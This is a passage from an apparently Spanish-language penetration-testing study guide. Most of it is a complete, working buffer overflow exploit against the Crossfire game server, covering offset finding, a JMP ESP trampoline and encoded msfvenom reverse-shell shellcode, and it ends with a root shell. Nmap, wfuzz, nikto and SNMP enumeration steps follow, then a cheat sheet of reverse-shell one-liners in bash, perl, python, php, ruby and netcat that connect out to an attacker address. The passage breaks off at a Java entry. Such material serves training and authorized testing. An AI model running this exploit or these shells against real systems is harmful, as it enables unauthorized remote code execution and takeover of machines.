g2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp&quot;

buffer = &quot;\x11(setup sound &quot; + crash + &quot;\x90\x00#&quot; 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print &quot;[*] Enviando buffer...&quot; 
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print &quot;[*] Payload Enviado!&quot; 
except:
	print &quot;\nError conectando con el servicio...\n&quot;
	sys.exit(0)
```

En el resultado desde **edb**, observamos la siguiente respuesta:

```bash
The debugged application encountered a segmentation fault.
The address 0x46367046 does not appear to be mapped.

If you would like to pass this exception to the application press Shift+[F7/F8/F9]
```

Teniendo estos valores que han sobreescrito el **EIP**, calculamos el Offset:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/BoF]
└──╼ #/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 46367046
[*] Exact match at offset 4368
```

Sabiendo ya que su valor es 4368, montamos el siguiente PoC para corroborar que tomamos el control del **EIP**:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;direccionIP&gt;\n&quot;
	sys.exit(0)

host = sys.argv[1]
port = 13327

# Total bytes: 4379
crash = &quot;A&quot;*4368 + &quot;B&quot;*4 + &quot;C&quot;*(4379-4368-4)

buffer = &quot;\x11(setup sound &quot; + crash + &quot;\x90\x00#&quot; 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print &quot;[*] Enviando buffer...&quot; 
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print &quot;[*] Payload Enviado!&quot; 
except:
	print &quot;\nError conectando con el servicio...\n&quot;
	sys.exit(0)
```

Obviamente, hacemos relleno con el caracter _C_ a fin de alcanzar los 4379 bytes. Obtenemos la siguiente respuesta desde **edb** tras enviar nuestro Buffer:

```bash
The debugged application encountered a segmentation fault.
The address 0x42424242 does not appear to be mapped.

If you would like to pass this exception to the application press Shift+[F7/F8/F9]
```

Dado que vemos que estamos tomando el control del EIP, la idea en este caso es analizar los registros con el objetivo de saber dónde situar nuestro Shellcode.

#### Register Enumeration

En este punto, dado que sabemos que el tamaño total aceptado antes de que el programa crashee de otra forma es **4379**, tenemos en consideración que de buffer mandamos **4368** y tras sobreescribir el **EIP** añadimos **4** bytes, dejando un total de **7 bytes** para generar nuestras instrucciones.

Este margen de 7 bytes como podremos intuir dispone de un espacio muy pequeño para fijar nuestro Shellcode, lo que hace que tengamos que saltar a otro registro donde podamos situar nuestro Payload sin inconveniente (es una técnica). Si atendemos al registro **EAX**, una vez se produce el desbordamiento de buffer, vemos que apunta justo al principio de nuestro Buffer:

`EAX: setup sound AAAAAAAAAAAAAAAA...`

Si hacemos memoria, podemos recordar que el buffer que enviamos posee un tamaño aceptable de 4368 bytes, lo que hace que tengamos espacio de sobra para situar nuestro Shellcode. No supondría ningún problema el saltar al registro **EAX**, pero para ello debemos tener en cuenta que tras producirse el desbordamiento, nuestros caracteres que serán convertidos a Opcodes comenzarán a situarse en el registro **ESP**, lo que hace que primero debamos buscar una dirección en la memoria con permisos de ejecución para que desde el **EIP** se aplique un salto al registro **ESP** y posteriormente de aquí saltar al registro **EAX**.

Nos encontraremos con un problema tras saltar al registro **EAX**, pero lo abordaremos más adelante.

#### JMP ESP Opcode

Recodemos que contamos con un margen de 7 bytes para definir nuestras instrucciones, donde una de ellas es el salto al registro **EAX** que pretendemos hacer para posteriormente situar nuestro Shellcode.

Lo primero será hacer que el registro **EIP** apunte al **ESP**, donde posteriormente insertaremos nuestros Opcodes. Para ello, desde **edb**, podemos tras producirse el desbordamiento presionar la tecla **Ctrl+O** para el _Opcode Searcher_. 

Una vez abierto, seleccionamos la dirección del binario **crossfire** que cuenta con permisos de ejecución, seleccionando de la lista desplegable el salto **ESP -&gt; EIP**. Pinchamos en **Find** y esperamos a que el programa encuentre las direcciones donde se realizan el salto al registro **ESP**.

Encontramos la siguiente:

`0x08134596: jmp esp`

Como es de esperar, nuestro registro **EIP** tomará dicho valor en formato _Little Endian_:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;direccionIP&gt;\n&quot;
	sys.exit(0)

host = sys.argv[1]
port = 13327

# Total bytes: 4379
crash = &quot;A&quot;*4368 + pack('&lt;L', 0x08134596) + &quot;C&quot;*(4379-4368-4)

buffer = &quot;\x11(setup sound &quot; + crash + &quot;\x90\x00#&quot; 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print &quot;[*] Enviando buffer...&quot; 
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print &quot;[*] Payload Enviado!&quot; 
except:
	print &quot;\nError conectando con el servicio...\n&quot;
	sys.exit(0)
```

Tras enviar el buffer, si establecemos previamente con la tecla **F2** un _breakpoint_ en el registro **0x08134596**, podremos ver como el aplicativo muestra que el registro **EIP** apunta a la dirección **0x08134596**, correspondiente al **ESP**. Pulsando la tecla **F8**, avanzaremos una instrucción por pulsación, donde se puede ver como las siguientes instrucciones son:

```bash
bffa:4de0 43           inc ebx
bffa:4de1 43           inc ebx
bffa:4de2 43           inc ebx
bffa:4de3 43           inc ebx
bffa:4de4 43           inc ebx
bffa:4de5 43           inc ebx
bffa:4de6 43           inc ebx
```

Correspondiente a los 7 bytes finales de margen que tenemos donde por el momento se encuentran situados nuestro caracter _C_.

#### JMP EAX From ESP

Ahora que controlamos el flujo del programa y estamos en el registro **ESP**, como este sólo cuenta con 7 bytes de margen, saltaremos al registro **EAX** con el objetivo de depositar posteriormente nuestro Shellcode.

Surge un problema a la hora de saltar al registro **EAX**, y es que la cadena '_setup sound_' es interpretada como **Opcode**:

```bash
73 65	jae 0xb7487a75
74 75	je 0xb7487a87
70 20	jo 0xb7487a34
73 6f	jae 0xb7487a85
75 6e	jne 0xb7487a86
```

Esto puede causar inconvenientes, pues el flujo del programa como vemos puede tomar saltos a otras direcciones no deseadas haciendo que posteriormente nuestro Shellcode no sea interpretado.

La cadena '_setup sound_' ocupa 12 bytes (con espacios incluidos), por lo que algo inteligente a hacer desde **nasm_shell.rb** es aplicar los siguientes Opcodes:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/BoF]
└──╼ #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm &gt; add eax,12
00000000  83C00C            add eax,byte +0xc
nasm &gt; jmp eax
00000000  FFE0              jmp eax
```

Desplazamos en un margen de 12 bytes el contenido de **EAX**, de forma que en estos 3 bytes de instrucción el registro se nos quedaría apuntando justo al comienzo de nuestro búffer (AAAAAAAA...), posteriormente en otros 2 bytes aplicamos un salto a dicho registro.

¿Lo bueno de todo esto?, que en total son 5 bytes de instrucción, y si recordamos contábamos con un margen de 7 bytes para realizar nuestras instrucciones... por lo tanto, de maravilla.

Estos Opcodes al fin y al cabo se traducen en &quot;**\x83\xC0\x0C\xFF\xE0**&quot;, de forma que nuestro script quedaría tal y como se representa a continuación:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;direccionIP&gt;\n&quot;
	sys.exit(0)

host = sys.argv[1]
port = 13327

# Total bytes: 4379
crash = &quot;A&quot;*4368 + pack('&lt;L', 0x08134596) + &quot;\x83\xC0\x0C\xFF\xE0&quot; + &quot;\x90\x90&quot;

buffer = &quot;\x11(setup sound &quot; + crash + &quot;\x90\x00#&quot; 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print &quot;[*] Enviando buffer...&quot; 
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print &quot;[*] Payload Enviado!&quot; 
except:
	print &quot;\nError conectando con el servicio...\n&quot;
	sys.exit(0)
```

Obviamente, añadimos 2 bytes de **NOPs** para completar el tamaño de 4379 bytes. Ahora que el flujo del programa se encamina por donde queremos, la idea es sustituir nuestras _Aes_ por nuestro Shellcode, teniendo en consideración que tras estar codificado por _shikata_, habrá que añadir unos 16 bytes de margen al principio del registro para que nuestro Shellcode se pueda decoficar.

¡Que no se nos olvide comprobar los Badchars!, que para este caso son &quot;**\x00\x0a\x0d\x20**&quot;. Este paso no hace falta detallarlo, pues no es el más complejo que digamos y ya lo hemos visto en Windows. Simplemente tener en cuenta que con el espacio que contamos en el registro **EAX** podemos ir mandando los caracteres a fin de analizar cuáles de ellos dan problema.

#### Msfvenom Linux Payload

Para generar nuestro Shellcode, aplicamos el siguiente comando:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/BoF]
└──╼ #msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.51 LPORT=443 -a x86 --platform linux -f c -e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d\x20&quot;
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
&quot;\xbd\x85\xd3\x0b\xb7\xdd\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1&quot;
&quot;\x12\x31\x6e\x12\x03\x6e\x12\x83\x6b\x2f\xe9\x42\x42\x0b\x19&quot;
&quot;\x4f\xf7\xe8\xb5\xfa\xf5\x67\xd8\x4b\x9f\xba\x9b\x3f\x06\xf5&quot;
&quot;\xa3\xf2\x38\xbc\xa2\xf5\x50\xff\xfd\x07\x93\x97\xff\x07\xd2&quot;
&quot;\xdc\x89\xe9\x64\x44\xda\xb8\xd7\x3a\xd9\xb3\x36\xf1\x5e\x91&quot;
&quot;\xd0\x64\x70\x65\x48\x11\xa1\xa6\xea\x88\x34\x5b\xb8\x19\xce&quot;
&quot;\x7d\x8c\x95\x1d\xfd&quot;;
```

Por último, considerando el tamaño de 95 bytes generados, preparamos nuestro Búffer:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;direccionIP&gt;\n&quot;
	sys.exit(0)

host = sys.argv[1]
port = 13327

# Shellcode (95 bytes) || msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.51 LPORT=443 -a x86 --platform linux -f c -e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d\x20&quot;
shellcode = (&quot;\xbd\x85\xd3\x0b\xb7\xdd\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1&quot;
&quot;\x12\x31\x6e\x12\x03\x6e\x12\x83\x6b\x2f\xe9\x42\x42\x0b\x19&quot;
&quot;\x4f\xf7\xe8\xb5\xfa\xf5\x67\xd8\x4b\x9f\xba\x9b\x3f\x06\xf5&quot;
&quot;\xa3\xf2\x38\xbc\xa2\xf5\x50\xff\xfd\x07\x93\x97\xff\x07\xd2&quot;
&quot;\xdc\x89\xe9\x64\x44\xda\xb8\xd7\x3a\xd9\xb3\x36\xf1\x5e\x91&quot;
&quot;\xd0\x64\x70\x65\x48\x11\xa1\xa6\xea\x88\x34\x5b\xb8\x19\xce&quot;
&quot;\x7d\x8c\x95\x1d\xfd&quot;)

# Total bytes: 4379
crash = &quot;\x90&quot;*16 + shellcode + &quot;A&quot;*(4368-95-16) + pack('&lt;L', 0x08134596) + &quot;\x83\xC0\x0C\xFF\xE0&quot; + &quot;\x90\x90&quot;

# 95 bytes
shellcode = (&quot;\xbd\x85\xd3\x0b\xb7\xdd\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1&quot;
&quot;\x12\x31\x6e\x12\x03\x6e\x12\x83\x6b\x2f\xe9\x42\x42\x0b\x19&quot;
&quot;\x4f\xf7\xe8\xb5\xfa\xf5\x67\xd8\x4b\x9f\xba\x9b\x3f\x06\xf5&quot;
&quot;\xa3\xf2\x38\xbc\xa2\xf5\x50\xff\xfd\x07\x93\x97\xff\x07\xd2&quot;
&quot;\xdc\x89\xe9\x64\x44\xda\xb8\xd7\x3a\xd9\xb3\x36\xf1\x5e\x91&quot;
&quot;\xd0\x64\x70\x65\x48\x11\xa1\xa6\xea\x88\x34\x5b\xb8\x19\xce&quot;
&quot;\x7d\x8c\x95\x1d\xfd&quot;)

buffer = &quot;\x11(setup sound &quot; + crash + &quot;\x90\x00#&quot; 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print &quot;[*] Enviando buffer...&quot;
	sleep(5)
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print &quot;[*] Payload Enviado!&quot; 
except:
	print &quot;\nError conectando con el servicio...\n&quot;
	sys.exit(0)
```

# Ganando Acceso al Sistema

Por último, cerramos **edb**, corremos el programa normalmente, enviamos el búffer y previamente estando en escucha desde **Netcat** por el puerto 443, ganamos acceso al sistema:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #nc -nlvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.1.81.
Ncat: Connection from 192.168.1.81:55272.
script /dev/null -c bash
Script started, file is /dev/null
root@kali:/root# whoami
whoami
root
root@kali:/root#
```

Pentesting
===============================================================================================================================

En este punto, se detallan técnicas de Pentesting a abordar sobre las máquinas Windows/Linux que se nos presenten.

### General

Bajo este apartado se describirán técnicas de enumeración a realizar sobre los Hosts independientemente del sistema operativo / servicio con el que se trate.

#### Port Scanning

Cada uno tiene su forma de hacer la enumeración de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.

* Escaneo inicial de puertos abiertos sobre el sistema

```bash
nmap -p- --open -T5 -v -oG allPorts ipHost -n
```
* Enumeración del servicio y versionado para los puertos descubiertos sobre el sistema

```bash
nmap -p$(cat allPorts | grep -oP '\d{2,5}/open' | awk '{print $1}' FS=&quot;/&quot; | xargs | tr ' ' ',') -sC -sV ipHost -oN targeted
```

La razón de hacer esto es que me parece mucho más ágil el poder tener una visual de los puertos abiertos de un primer tirón para el escaneo inicial, así en lo que posteriormente lanzo el profundo de enumeración de servicios con los scripts básicos de enumeración, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).

* En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante

```bash
nmap -A -T4 -v ipHost -oN misc
```

Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de búsqueda a fin de determinar los puertos que están abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciéndolo incompleto):

```bash
nmap -p1-10000 --open -T5 -v ipHost -n -oG range1-10000
nmap -p10000-20000 --open -T5 -v ipHost -n -oG range10000-20000
nmap -p20000-30000 --open -T5 -v ipHost -n -oG range20000-30000
                        .
                        .
                        .
```

En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script **http-enum.nse** de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeño pero nos puede servir para tener una visual rápida sobre los recursos alojados):

```bash
nmap --script=http-enum.nse -p80,443,8080 ipHost -oN webScan
```

* Visualización de categorías para los scripts de nmap

```bash
grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '&quot;.*?&quot;' | sort -u
```

Estas categorías son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorías:

```bash
nmap -p21,445 --script=&quot;vuln and safe&quot; ipHost -oN vulnSafeScan
```

En cuanto a los **Low Hanging Fruit**, puertos interesantes a buscar para nuestros escaneos iniciales pueden ser los siguientes (Hay muchos más, pero corresponden a servicios que nos pueden garantizar la ejecución de comandos en remoto sobre los sistemas):

```bash
nmap -p21,1433 192.168.1.0/24 --open -T5 -v -n -oN LHF
```

Sobre el servicio **FTP** resulta interesante comprobar que podamos subir archivos. En caso de contar con un IIS, si vemos que somos capaces de alojar un fichero asp/aspx y apuntar al mismo desde el servicio web, podremos entablar una conexión TCP reversa.

Sobre el servicio **ms-sql-s**, una de las pruebas que suelo utilizar de cabeza es la de realizar una autenticación vía **sqsh** contra el servicio proporcionando las credenciales **sa** de usuario sin contraseña. Puede llegar a pasar que el servicio no se encuentre corriendo sobre el puerto 1433, en ese caso podemos hacer uso de la herramienta [mssql.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)

#### Wfuzz

Aunque también se puede hacer uso de **Dirbuster**, siempre he sido más partidiario de lidiar con **Wfuzz**. La sintaxis general para la búsqueda de directorios que empleo es la siguiente:

```bash
wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.X/FUZZ
```

En caso de querer recorrer un rango numérico, por ejemplo para un caso práctico donde vemos que contamos con un servicio web desde el cual podemos hacer consultas a otro servicio web, algo que podemos hacer es aprovechar dicha funcionalidad para enumerar puertos internos que corran sobre el sistema desde el cual estamos aplicando las consultas.

Esta parte me recuerda sobre todo a una máquina de HackTheBox, donde figuraba ciertos servicios HTTP corriendo que no eran accesibles desde fuera de la máquina. Con el objetivo de determinar estos puertos, podemos atender a los códigos de estado del lado de la respuesta del servidor, ocultando por ejemplo el código de estado 404:

```bash
wfuzz -c --hc=404 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ
```

De esta forma, se nos mostrará únicamente resultados donde se devuelva un código de estado diferente al 404.

De manera alternativa, también podríamos haber aplicado lo siguiente:

```bash
wfuzz -c --sc=200 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ
```

Para mostrar peticiones que devuelvan un 200 cómo código de estado. Al igual que el código de estado se pueden jugar con más parámetros de filtro, como los caracteres, el número total de líneas, etc.

**Importante:** A la hora de obtener un **Forbidden** en el código de estado de la respuesta del lado del servidor, recomiendo no tirar la toalla... pues a pesar de figurarnos dicha respuesta, podemos seguir enumerando directorios y archivos dentro de dicho directorio, donde tras dar con recursos válidos vemos que estos son visibles desde la web.

Para tener un caso práctico, supongamos que tenemos un directorio **/design** que nos devuelve un Forbidden. Algo que podemos hacer es configurar una enumeración de doble Payload desde wfuzz a fin de descubrir recursos existentes bajo dicho directorio.

Para ello, nos creamos un fichero _extensions.txt_ con el siguiente contenido:

```bash
php
txt
html
xml
cgi
```

Posteriormente, hacemos uso de Wfuzz siguiendo la siguiente sintaxis:

`wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z file,extensions http://192.168.1.X/design/FUZZ.FUZ2Z`

De esta forma, estaremos para cada una de las líneas del payload principal comprobando las extensiones especificadas sobre el segundo payload.

#### Nikto

Sinceramente no he llegado a profundizar mucho sobre esta herramienta, pero dado que forma parte de una de las herramientas de automatización que admiten en el examen y a veces devuelve maravillas... detallo su uso:

`nikto -h http://192.168.1.X`

#### SNMP Enumeration

Aunque se trata de un servicio que corre bajo un puerto por **UDP**, parece inofensivo pero la enumeración sobre dicho servicio nos puede permitir enumerar más de la cuenta a nivel de sistema para saber qué software corren, así como rutas, usuarios del sistema, puertos internos abiertos TCP/UDP, etc.

Para detectar si el servicio está operativo:

```bash
nmap -p161 -sU --open -T5 -v -n 192.168.1.X
```

En caso de estar abierto, lo primero será averiguar la _Community String_. Generalmente suele ser **public**, pero por si acaso, nos montamos un ligero diccionario:

```bash
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $echo -e &quot;public\nprivate\nmanager&quot; &gt; community.txt
┌─[s4vitar@parrot]─[~/Desktop]
└──╼ $cat community.txt 
public
private
manager
```

Una vez creado, utilizamos **onesixtyone** para bruteforcear la Community String del servicio:

```bash
onesixtyone -c community.txt -i ficheroIPS.txt
Scanning 2 hosts, 3 communities
10.11.1.X [public] Linux example 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686
10.11.1.Y [public] Linux example 2.4.20-8 #1 Thu Mar 13 17:54:28 EST 2003 i686
```

Con esto, tras ver que la Community String es **public**, consideramos los siguientes valores MIB:

```bash
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```

Hay muchos más... pero a modo de ejemplo son los más significativos. Suponiendo que quisiéramos saber qué procesos corre el sistema, aplicaríamos el siguiente comando desde **snmpwalk**:

```bash
$~ snmpwalk -c public -v1 10.11.1.X 1.3.6.1.2.1.25.1.6.0
```

Inmediatamente, obtendremos una lista de los procesos que corren bajo el sistema.

En caso de querer aplicar un análisis exhaustivo sin especificación de valor **MIB**, aplicamos el siguiente comando:

```bash
$~ snmpwalk -c public -v1 10.11.1.X
```

Y seguidamente, se nos listará montón de información relevante de la máquina. Aunque parezca tontería, hay ocasiones en las que gracias a ver la versión de un servicio en concreto a través del **SNMP**, he podido explotar una vulnerabilidad que jamás habría podido encontrar desde fuera, por lo que lo considero un servicio fundamental a enumerar.

#### Reverse Shell

Un paso fundamental a la hora de logar **RCE** es tener controlados los tipos de conexiones reversas que podemos entablar en distintos lenguajes. Adjunto por aquí un listado de las más utilizadas:

**Bash**
```bash
bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
```

**Perl**
```bash
perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
```

**Python**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
```

**PHP**
```bash
php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
```

**Ruby**
```bash
ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
```

**Netcat**
```bash
nc -e /bin/sh 10.0.0.1 1234
```

**Netcat (Wrong Version)**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
```

**Java**
```bash
r = Runtime.getRuntime()
